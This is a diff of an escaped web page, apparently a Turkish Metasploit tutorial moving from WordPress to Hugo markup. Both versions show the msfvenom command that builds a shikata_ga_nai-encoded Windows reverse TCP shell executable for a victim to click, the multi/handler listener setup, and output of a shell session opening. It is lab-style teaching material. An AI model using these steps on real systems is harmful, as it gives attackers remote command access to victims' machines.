+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Basic options:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name      Current Setting  Required  Description
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----      ---------------  --------  -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EXITFUNC  process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LHOST                      yes       The listen address
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LPORT     &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The listen port
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Description:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Spawn a piped &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; shell &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;staged&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;. Connect back to the attacker&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
 
-       Name: Windows Command Shell, Reverse TCP Stager
-     Module: payload/windows/shell/reverse_tcp
-   Platform: Windows
-       Arch: x86
-Needs Admin: No
- Total size: 281
-       Rank: Normal
+  
+&lt;/div&gt;
+&lt;p&gt;Bu modül, çıktıda görüldüğü gibi &lt;code&gt;LHOST&lt;/code&gt; ve &lt;code&gt;LPORT&lt;/code&gt; değişkenlerinin ayarlanmasına ihtiyaç duymaktadır. Hedef platform olarak x86 mimari ve Windows işletim sistemi seçilmiştir. Oluşturacağımız payload için bir encoder kullanmamız gerekiyor. Bunun için de &lt;code&gt;x86/shikata_ga_nai&lt;/code&gt; encoder modülünü kullanacağız. Bu şartlar altında aşağıdaki komut, encoder kullanarak &lt;code&gt;/tmp&lt;/code&gt; klasörünün içinde &lt;code&gt;1.exe&lt;/code&gt; isimli bir dosya oluşturacaktır.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
 
-Provided by:
-    spoonm 
-    sf 
-    hdm 
-    skape 
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.104.130 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;31337&lt;/span&gt; -b &lt;span class=&#34;s2&#34;&gt;&amp;#34;\x00&amp;#34;&lt;/span&gt; -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Found &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; compatible encoders
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Attempting to encode payload with &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; iterations of x86/shikata_ga_nai
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;x86/shikata_ga_nai succeeded with size &lt;span class=&#34;m&#34;&gt;326&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;iteration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;x86/shikata_ga_nai chosen with final size &lt;span class=&#34;m&#34;&gt;326&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload size: &lt;span class=&#34;m&#34;&gt;326&lt;/span&gt; bytes
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Saved as: /tmp/1.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
 
-Basic options:
-Name      Current Setting  Required  Description
-----      ---------------  --------  -----------
-EXITFUNC  process          yes       Exit technique ***(*** Accepted: &#39;&#39;, seh, thread, process, none***)*** 
-LHOST                      yes       The listen address
-LPORT     4444             yes       The listen port
+  
+&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;1.exe&lt;/code&gt; dosyamızın türünü kontrol edelim. &lt;code&gt;file&lt;/code&gt; komutuyla yaptığımız kontrolde &lt;code&gt;1.exe&lt;/code&gt; doyasının MS Windows dosyası olduğu aşağıda görülmektedir.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
 
-Description:
-  Spawn a piped command shell ***(*** staged***)*** . Connect back to the attacker
-&lt;/code&gt;&lt;/pre&gt;
-&lt;!-- /wp:code --&gt;
-&lt;p&gt;Bu modül, çıktıda görüldüğü gibi &lt;code&gt;LHOST&lt;/code&gt; ve &lt;code&gt;LPORT&lt;/code&gt; değişkenlerinin ayarlanmasına ihtiyaç duymaktadır. Hedef platform olarak x86 mimari ve Windows işletim sistemi seçilmiştir. Oluşturacağımız payload için bir encoder kullanmamız gerekiyor. Bunun için de &lt;code&gt;x86/shikata_ga_nai&lt;/code&gt; encoder modülünü kullanacağız. Bu şartlar altında aşağıdaki komut, encoder kullanarak &lt;code&gt;/tmp&lt;/code&gt; klasörünün içinde &lt;code&gt;1.exe&lt;/code&gt; isimli bir dosya oluşturacaktır.&lt;/p&gt;
-&lt;!-- wp:code --&gt;
-&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code lang=&#34;bash&#34; class=&#34;language-bash&#34;&gt;root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST***=*** 172.16.104.130 LPORT***=*** 31337 -b &#34;\x00&#34; -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
-Found 1 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 326 ***(*** iteration***=*** 0***)*** 
-x86/shikata_ga_nai chosen with final size 326
-Payload size: 326 bytes
-Saved as: /tmp/1.exe
-&lt;/code&gt;&lt;/pre&gt;
-&lt;!-- /wp:code --&gt;
-&lt;p&gt;&lt;code&gt;1.exe&lt;/code&gt; dosyamızın türünü kontrol edelim. &lt;code&gt;file&lt;/code&gt; komutuyla yaptığımız kontrolde &lt;code&gt;1.exe&lt;/code&gt; doyasının MS Windows dosyası olduğu aşağıda görülmektedir.&lt;/p&gt;
-&lt;!-- wp:code --&gt;
-&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code lang=&#34;bash&#34; class=&#34;language-bash&#34;&gt;root@kali:~# file /tmp/1.exe
-/tmp/1.exe: PE32 executable ***(*** GUI***)***  Intel 80386, ***for *** MS Windows
-&lt;/code&gt;&lt;/pre&gt;
-&lt;!-- /wp:code --&gt;
-&lt;h2 class=&#34;wp-block-heading&#34; id=&#34;dinleme-ayarları&#34;&gt;Dinleme Ayarları
-&lt;!-- /wp:heading --&gt;
-&lt;p&gt;Elimizde istemcinin tıklayıp çalıştıracağı &lt;code&gt;1.exe&lt;/code&gt; dosyası artık hazır durumda. Şimdi, tıklama işlemi gerçekleştiğinde dinleyecek bir modülü çalıştırmamız gerekiyor. Bunun için &lt;code&gt;exploit/multi/handler&lt;/code&gt; modülünü ve içinde &lt;code&gt;payload windows/shell/reverse_tcp&lt;/code&gt; dinleyici payload u kullanacağız.&lt;/p&gt;
-&lt;p&gt;Öncelikle &lt;code&gt;exploit/multi/handler&lt;/code&gt; modülünü yükleyip seçeneklere bakalım.&lt;/p&gt;
-&lt;!-- wp:code --&gt;
-&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code lang=&#34;bash&#34; class=&#34;language-bash&#34;&gt;msf ***&amp;gt;***  use exploit/multi/handler
-msf exploit***(*** handler***)***  ***&amp;gt;***  show options
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@kali:~# file /tmp/1.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/tmp/1.exe: PE32 executable &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GUI&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Intel 80386, &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; MS Windows&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
 
-Module options:
+  
+&lt;/div&gt;
+&lt;h2&gt;Dinleme Ayarları&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;dinleme-ayarları&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#dinleme-ayarlar%c4%b1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Elimizde istemcinin tıklayıp çalıştıracağı &lt;code&gt;1.exe&lt;/code&gt; dosyası artık hazır durumda. Şimdi, tıklama işlemi gerçekleştiğinde dinleyecek bir modülü çalıştırmamız gerekiyor. Bunun için &lt;code&gt;exploit/multi/handler&lt;/code&gt; modülünü ve içinde &lt;code&gt;payload windows/shell/reverse_tcp&lt;/code&gt; dinleyici payload u kullanacağız.&lt;/p&gt;
+&lt;p&gt;Öncelikle &lt;code&gt;exploit/multi/handler&lt;/code&gt; modülünü yükleyip seçeneklere bakalım.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
 
-   Name  Current Setting  Required  Description 
-   ----  ---------------  --------  ----------- 
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf &amp;gt; use exploit/multi/handler
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name  Current Setting  Required  Description 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----  ---------------  --------  ----------- 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Exploit target:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Id  Name            
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   --  ----            
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
 
-
-Exploit target:
-
-   Id  Name            
-   --  ----            
-   0   Wildcard Target
-&lt;/code&gt;&lt;/pre&gt;
-&lt;!-- /wp:code --&gt;
+  
+&lt;/div&gt;
 &lt;p&gt;Gördüğünüz gibi exploit modülünde herhangi bir zorunlu değişken bulunmuyor. Şimdi payload ayarlaması yapalım.&lt;/p&gt;
-&lt;!-- wp:code --&gt;
-&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code lang=&#34;bash&#34; class=&#34;language-bash&#34;&gt;msf exploit***(*** handler***)***  ***&amp;gt;***  set payload windows/shell/reverse_tcp
-payload ***=&amp;gt;***  windows/shell/reverse_tcp
-msf exploit***(*** handler***)***  ***&amp;gt;***  show options
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
 
-Module options:
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/shell/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; windows/shell/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name  Current Setting  Required  Description
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----  ---------------  --------  -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/shell/reverse_tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name      Current Setting  Required  Description
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----      ---------------  --------  -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   EXITFUNC  thread           yes       Exit technique: seh, thread, process
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LHOST                      yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; address
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LPORT     &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; port
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Exploit target:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Id  Name
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   --  ----
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
 
-   Name  Current Setting  Required  Description
-   ----  ---------------  --------  -----------
-
-
-Payload options ***(*** windows/shell/reverse_tcp***)*** :
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique: seh, thread, process
-   LHOST                      yes       The local address
-   LPORT     4444             yes       The local port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Wildcard Target 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;!-- /wp:code --&gt;
-&lt;p&gt;Bu çıktıda görülmektedir ki Payload için &lt;code&gt;LHOST&lt;/code&gt; ve &lt;code&gt;LPORT&lt;/code&gt; değerlerinin girilmesi gerekmekte.&lt;/p&gt;
+  
+&lt;/div&gt;
+&lt;p&gt;Bu çıktıda görülmektedir ki Payload için &lt;code&gt;LHOST&lt;/code&gt; ve &lt;code&gt;LPORT&lt;/code&gt; değerlerinin girilmesi gerekmekte.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;LHOST&lt;/code&gt;: Local Host yani yerelde dinleyecek IP adresini,&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;LPORT&lt;/code&gt;: Local Port, yani dinleyecek Port numarasını ifade eder.&lt;/p&gt;
-&lt;p&gt;Bu değerlerin, &lt;code&gt;msfvenom&lt;/code&gt; komutuyla oluşturduğumuz &lt;code&gt;1.exe&lt;/code&gt; dosyası için girdiğimiz değerler ile aynı olmasına dikkat edin. &lt;code&gt;1.exe&lt;/code&gt; dosyası içinde hangi değerler gömülü ise zararlı yazılım bu bilgilere göre haberleşme sağlamak isteyecektir.&lt;/p&gt;
-&lt;!-- wp:code --&gt;
-&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code lang=&#34;bash&#34; class=&#34;language-bash&#34;&gt;msf exploit***(*** handler***)***  ***&amp;gt;***  set LHOST 172.16.104.130
-LHOST ***=&amp;gt;***  172.16.104.130
-msf exploit***(*** handler***)***  ***&amp;gt;***  set LPORT 31337
-LPORT ***=&amp;gt;***  31337
-msf exploit***(*** handler***)***  ***&amp;gt;*** 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;!-- /wp:code --&gt;
-&lt;p&gt;Tüm ayarlamaları yaptıktan sonra &lt;code&gt;exploit&lt;/code&gt; komutuyla modül çalıştırılır ve dinlemeye başlanır. Aşağıda, dinleme sonucunda gerçekleşen bir istemci tıklaması sonucu açılan komut satırı görülmektedir.&lt;/p&gt;
-&lt;!-- wp:code --&gt;
-&lt;pre class=&#34;wp-block-code&#34;&gt;&lt;code lang=&#34;bash&#34; class=&#34;language-bash&#34;&gt;msf exploit***(*** handler***)***  ***&amp;gt;***  exploit
+&lt;p&gt;Bu değerlerin, &lt;code&gt;msfvenom&lt;/code&gt; komutuyla oluşturduğumuz &lt;code&gt;1.exe&lt;/code&gt; dosyası için girdiğimiz değerler ile aynı olmasına dikkat edin. &lt;code&gt;1.exe&lt;/code&gt; dosyası içinde hangi değerler gömülü ise zararlı yazılım bu bilgilere göre haberleşme sağlamak isteyecektir.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
 
-***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
-***[*** ******* ***]***  Started reverse handler
-***[*** ******* ***]***  Starting the payload handler...
-***[*** ******* ***]***  Sending stage ***(*** 474 bytes***)*** 
-***[*** ******* ***]***  Command shell session 2 opened ***(*** 172.16.104.130:31337 -&amp;gt; 172.16.104.128:1150***)*** 
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LHOST 172.16.104.130
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 172.16.104.130
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;m&#34;&gt;31337&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;m&#34;&gt;31337&lt;/span&gt;
